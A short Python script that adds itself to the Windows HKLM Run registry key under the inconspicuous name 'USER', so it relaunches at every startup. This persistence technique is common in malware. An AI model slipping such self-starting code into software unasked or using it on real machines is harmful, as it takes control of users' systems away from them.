import sys
import winreg
res = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,winreg.KEY_ALL_ACCESS)
winreg.CreateKey(res, "USER")
winreg.SetValueEx(res, "USER", 0, winreg.REG_EXPAND_SZ, sys.argv[0])
winreg.CloseKey(res)
